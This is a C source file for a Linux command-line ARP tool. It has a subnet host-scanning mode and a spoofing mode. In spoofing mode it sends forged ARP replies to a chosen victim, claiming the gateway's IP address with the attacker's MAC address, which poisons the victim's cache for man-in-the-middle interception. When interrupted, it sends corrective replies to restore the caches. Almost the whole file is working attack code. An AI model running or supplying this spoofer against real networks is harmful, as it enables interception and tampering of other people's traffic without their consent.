#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <signal.h>
#include <sys/wait.h>
#include <pthread.h>
#include "util.h"

#define BUF_SIZE 65536

struct ether_addr;
extern char * ether_ntoa(struct ether_addr *); //library fucntion
extern struct ether_addr * ether_aton(const char *);

typedef struct
{
	unsigned int ip;
	unsigned int subnet;
	unsigned int vip; //virtual ip
	unsigned char mac[6];
	unsigned char * vmac; //virtual mac
}host;

typedef void (*routine)(int);

void scanning(int);
void spoofing(int);

static host this;
static host gateway;

static routine actions[3] = {scanning, spoofing, NULL};
static int action = 0;

static host * host_list[65536];

static int is_end = 0;

static unsigned int my = 0;

void param_parse(int argc, char * argv[])
{
	static const char * usage = "sudo ./arp {some parameters}\n" 
		"scanning {virtual ip}\n"
		"spoof {default target is all, virtual mac}\n";

	if (argc <= 1)
	{
		int idx = 0;
		printf("usage\n%s", usage);
		exit(-1);
	}
	else
	{
		int idx = 1;

		if (!strcmp(argv[idx], "hostscan"))
		{
			action = 0;
			if (idx + 1 < argc)
				this.vip = inet_addr(argv[idx + 1]);	
		}
		else if (!strcmp(argv[idx], "spoof"))
		{
			action = 1;
			/*if (idx + 1 < argc)
			{
				this.vmac = (unsigned char *)malloc(6);
				memcpy(this.vmac, (unsigned char *)ether_aton(argv[idx + 1]), 6);
			}*/
			if (idx + 1 < argc)
			{

				my = inet_addr(argv[idx + 1]);
			}
		}
		else
		{
			printf("Invalid parameter: %s\n", argv[idx]);
			exit(-1);
		}
	}	
}

int init_base()
{
	struct if_nameindex * if_arr, * itf;
	struct ifreq ifr;
	int sock, index, nr = 0;
	
	if (get_gateway(&gateway.ip, gateway.mac) < 0)
		goto gateway_err;
	
	printf("-----default gateway-----\n---> %s [%s]\n\n", inet_ntoa(*(struct in_addr *)&gateway.ip), 
				ether_ntoa((struct ether_addr *)(gateway.mac)));
	
	sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0)
		goto socket_err;

	if_arr = if_nameindex();
	if (!if_arr)
		goto if_nameindex_err;
	
	printf("-----network interface list-----\n");
	for (itf = if_arr; itf->if_index != 0 || itf->if_name != NULL; itf++, nr++)
	{
		printf("%s(%d)\n", itf->if_name, itf->if_index);
	}
	
	printf("\nChoose interface index\n>> ");
	scanf("%d", &index);
	index--;

	if (index >= nr)
		goto out_of_bound;
	itf = if_arr + index;

	memcpy(ifr.ifr_name, itf->if_name, sizeof(ifr.ifr_name));
	ioctl(sock, SIOCGIFADDR, &ifr);
	memcpy(&this.ip, &ifr.ifr_addr.sa_data[2], sizeof(this.ip));
	ioctl(sock, SIOCGIFNETMASK, &ifr);
	memcpy(&this.subnet, &ifr.ifr_netmask.sa_data[2], sizeof(this.subnet));
	ioctl(sock, SIOCGIFHWADDR, &ifr);
	memcpy(this.mac, &ifr.ifr_hwaddr.sa_data, sizeof(this.mac));

	close(sock);
	return index + 1;

gateway_err:
	perror("get_gateway() error");
	exit(-1);
socket_err:
	perror("socket() error");
	exit(-1);
if_nameindex_err:
	perror("if_nameindex() error");
	exit(-1);
out_of_bound:
	printf("Invalid choice: %d\n", index + 1);
	exit(-1);
}

unsigned char * create_arp_packet(unsigned char * buf, unsigned short op, 
				unsigned char * host, unsigned int src,
				unsigned char * target, unsigned int dest)
{
	unsigned char * ptr;
	struct ethhdr * eth;
	struct arphdr * arp;

	eth = (struct ethhdr *)buf;
	//set ethernet header
	memcpy(eth->h_source, host, 6); //MAC address length
	if (!target)
		memset(eth->h_dest, 0xff, 6); //broadcast
	else
		memcpy(eth->h_dest, target, 6);
	eth->h_proto = htons(ETH_P_ARP);

	arp = (struct arphdr *)(eth + 1);
	//set arp header
	arp->ar_hrd = htons(1); //Ethernet
	arp->ar_pro = htons(ETH_P_IP); //IPv4
	arp->ar_hln = 6; //hw address length
	arp->ar_pln = 4; //ip address length
	arp->ar_op = htons(op);

	ptr = (unsigned char *)(arp + 1);
	//payload
	memcpy(ptr, host, 6); //sha
	ptr += 6;
	memcpy(ptr, &src, 4); //spa
	ptr += 4;
	if (!target) //tha
		memset(ptr, 0, 6); //unknown
	else
		memcpy(ptr, target, 6);
	ptr += 6;
	memcpy(ptr, &dest, 4); //tpa

	return buf;
}

void * reply_handle(void * arg)
{
	unsigned char buf[BUF_SIZE], * ptr;
	struct arphdr * arp;

	int sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int * tot = (int *)arg;

	while (1)
	{
		int len = recvfrom(sock, buf, BUF_SIZE, 0, NULL, NULL);
		unsigned int nr;
		host * target;

		if (len <= 0)
		{
			perror("recvfrom() error\n");
			break;
		}

		buf[len] = 0;
		ptr = buf;
		ptr += sizeof(struct ethhdr);
		arp = (struct arphdr *)ptr;
	
		if (ntohs(arp->ar_op) != ARPOP_REPLY)
			continue;

		ptr += sizeof(struct arphdr);
		ptr += 6; //spa

		nr = (*(unsigned int *)ptr);
		nr = ntohl(nr & ~this.subnet);
		if (host_list[nr])
			continue;

		host_list[nr] = (host *)malloc(sizeof(host));
		target = host_list[nr];

		printf("%s\t[%s]\tis alive\n", inet_ntoa(*(struct in_addr *)ptr), 
				ether_ntoa((struct ether_addr *)(ptr - 6)));

		memcpy(&target->ip, ptr, 4);
		memcpy(target->mac, ptr - 6, 6);
		*tot += 1;
		usleep(100);
	}	
	
	close(sock);
	return NULL;
}

void scanning(int idx)
{
	unsigned int host = 1;
	unsigned int network_addr = this.ip & this.subnet;
	unsigned int target;
	int arp_sock, pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	unsigned int max, used;
	pthread_t tid;
	unsigned char buf[BUF_SIZE];
	struct sockaddr_ll device;
	int tot = 0;

	arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	pthread_create(&tid, NULL, reply_handle, &tot);

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = idx;
	device.sll_halen = ETH_ALEN;
	memset(device.sll_addr, 0xff, 6);

	max = ntohl(~this.subnet); //maximum host number

	if (this.vip == 0)
		used = this.ip;
	else
		used = this.vip;

	printf("the time for host scan: %f sec\n\n", max * 0.0008);
	while (host <= max)
	{
		target = network_addr | htonl(host++);
		create_arp_packet(buf, ARPOP_REQUEST, this.mac, used, NULL, target);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(800);
	}
	
	pthread_cancel(tid);
	close(arp_sock);
	printf("there are [%d] hosts, except you\n", tot);
}

void sigint_handle(int sig)
{
	is_end = 1;
}

void spoofing(int idx) //default is for all hosts
{
	int t;
	unsigned char buf[BUF_SIZE], * used;
	unsigned int max = ntohl(~this.subnet);
	int arp_sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	int pkt_size = sizeof(struct ethhdr) + sizeof(struct arphdr) + 20;
	struct sockaddr_ll device;

	memset(&device, 0, sizeof(device));
	device.sll_ifindex = idx;
	device.sll_halen = ETH_ALEN;
	memset(device.sll_addr, 0xff, 6);
	
	scanning(idx);

	signal(SIGINT, sigint_handle);

	if (this.vmac)
		used = this.vmac;
	else
		used = this.mac;

	printf("\n\n\tarp spoofing start\n");
	//modified packet
	for (t = 1; !is_end && t <= max; t++)
	{	
		if (t == max)
		{
			t = 0;
			continue;
		}
		
		if (!host_list[t])
			continue;
		if (host_list[t]->ip == gateway.ip)
			continue;
		if (host_list[t]->ip != my)
			continue;

		create_arp_packet(buf, ARPOP_REPLY, used, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(100);
	}
	//normal packet
	for (t = 1; t <= max; t++)
	{
		if (!host_list[t])
			continue;
		if (host_list[t]->ip == gateway.ip)
			continue;
		create_arp_packet(buf, ARPOP_REPLY, gateway.mac, gateway.ip, host_list[t]->mac, host_list[t]->ip);
		sendto(arp_sock, buf, pkt_size, 0, (struct sockaddr *)&device, sizeof(device));
		usleep(100);
	}

	close(arp_sock);
	printf("\tarp spoofing stop\n");
}

int main(int argc, char * argv[])
{
	int idx;

	param_parse(argc, argv);

	idx = init_base();

	actions[action](idx);	
	
	for (idx = 0; idx < 65536; idx++)
	{
		if (host_list[idx])
			free(host_list[idx]);
	}

	return 0;
}
